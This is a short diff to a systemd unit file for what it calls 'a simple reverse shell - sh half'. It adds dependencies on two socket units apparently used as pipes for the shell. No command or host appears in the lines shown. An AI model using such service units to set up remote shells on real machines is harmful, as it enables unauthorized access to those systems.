@@ -1,6 +1,8 @@
 ; https://www.freedesktop.org/software/systemd/man/systemd.service.html
 [Unit]
 Description=A simple reverse shell - sh half
+Requires=backpipe.socket
+Requires=frontpipe.socket
 
 [Service]
 Type=simple
